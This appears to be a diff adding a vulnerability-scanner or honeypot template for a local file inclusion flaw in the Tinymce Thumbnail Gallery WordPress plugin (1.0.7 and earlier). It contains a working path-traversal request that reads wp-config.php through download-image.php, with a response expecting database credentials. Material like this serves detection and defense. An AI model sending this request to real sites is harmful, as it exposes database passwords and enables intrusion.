@@ -1,0 +1,27 @@
+id: wp-tinymce-lfi
+info:
+  name: Tinymce Thumbnail Gallery <=1.0.7 - Local File Inclusion
+  author: 0x_Akoko
+  description: Tinymce Thumbnail Gallery 1.0.7 and before are vulnerable to local
+    file inclusion via download-image.php.
+  severity: high
+  reference:
+  - https://wpscan.com/vulnerability/4a49b023-c1c9-4cc4-a2fd-af5f911bb400
+  - http://wordpress.org/extend/plugins/tinymce-thumbnail-gallery/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: wpscan,wordpress,wp-theme,lfi,tinymce
+traps:
+- request:
+    method: GET
+    path: /wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: DB_NAMEDB_PASSWORD
